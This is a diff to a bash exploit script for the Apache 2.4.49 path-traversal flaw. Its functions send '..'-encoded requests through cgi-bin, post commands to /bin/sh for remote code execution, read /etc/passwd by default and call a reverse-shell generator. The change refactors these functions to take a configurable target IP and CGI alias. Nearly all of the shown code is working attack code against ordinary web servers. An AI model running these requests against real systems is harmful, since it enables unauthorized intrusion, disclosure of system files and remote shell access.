@@ -1,4 +1,7 @@
 #!/bin/bash
+SCRIPTDIR=$(dirname "${BASH_SOURCE[0]}")
+source $SCRIPTDIR/project.sh
+
 traverse() {
   ip=$1
   port=$2
@@ -77,19 +80,24 @@ escape_regex() {
 apache_2449_cgi() {
   local level=$1
   local port=$2
-  local script=$3
-  local cmd=$4
   if [[ -z "$level" ]]; then
     level=4
   fi
   if [[ -z "$script" ]]; then
-    script="bin/bash"
+    script="bin/sh"
+  fi
+  if [[ -z "$cgi_alias" ]]; then
+    cgi_alias="cgi-bin"
+  fi
+  if [[ -z "$target_ip" ]]; then
+    echo "Target IP not set, using default $ip"
+    target_ip=$ip
   fi
   up=""
   for i in $(seq 1 $level); do
     up+="../"
   done
-  path="cgi-bin/$up""$script"
+  path="$cgi_alias/$up""$script"
   echo "Traversing to: $path"
   path=$(echo $path | sed 's/\.\./%2e%2e/g')
   if [[ -z "$cmd" ]]; then
@@ -108,32 +116,43 @@ apache_2449_cgi() {
   if [[ -d "$log_dir" ]]; then
     trail_log="$log_dir/trail.log"
   fi
-  curl -s --path-as-is -d "$cmd" "http://$ip:$port/$path" | tee -a $trail_log
+  curl -s --path-as-is -d "$cmd" "http://$target_ip:$port/$path" | tee -a $trail_log
 
 }
 
 apache_2449_nocgi() {
-  local level=$1
-  local target=$2
-  local output=$3
-  if [[ -z "$level" ]]; then
-    level=4
+  
+  if [[ ! -z $1 ]]; then
+    target_level=$1
+  fi
+  if [[ ! -z $2 ]]; then
+    target_path=$2
+  fi
+  if [[ ! -z $3 ]]; then
+    target_output=$3
+  fi
+  if [[ -z "$target_level" ]]; then
+    target_level=4
   fi
   up=""
-  for i in $(seq 1 $level); do
+  for i in $(seq 1 $target_level); do
     up+="../"
   done
-  if [[ -z "$target" ]]; then
-    target="etc/passwd"
-  fi  
-  path="cgi-bin/$up""$target"
+  if [[ -z "$target_path" ]]; then
+    target_path="etc/passwd"
+  fi
+  if [[ -z "$target_ip" ]]; then
+    echo "Target IP not set, using default $ip"
+    target_ip=$ip
+  fi
+  local path="cgi-bin/$up""$target_path"
   echo "Traversing to: $path"
   path=$(echo $path | sed 's/\.\./%2e%2e/g')
   cmd=$(get_bash_reverse_shell)
   if [[ -z "$port" ]]; then
     port=80  # Default port if not set
   fi
-  if [[ -z "$ip" ]]; then
+  if [[ -z "$target_ip" ]]; then
     echo "IP or port not set, cannot execute command."
     return 1
   fi
@@ -142,10 +161,10 @@ apache_2449_nocgi() {
   fi
   if [[ -d "$log_dir" ]]; then
     trail_log="$log_dir/trail.log"
-  fi  
-  if [[ ! -z "$output" ]]; then
-      curl_output_option="-o $output"  
   fi
-  curl -s $curl_output_option --path-as-is "http://$ip:$port/$path" | tee -a $trail_log
+  if [[ ! -z "$target_output" ]]; then
+      curl_output_option="-o $target_output"
+  fi
+  curl -s $curl_output_option --path-as-is "http://$target_ip:$port/$path" | tee -a $trail_log
 
 }
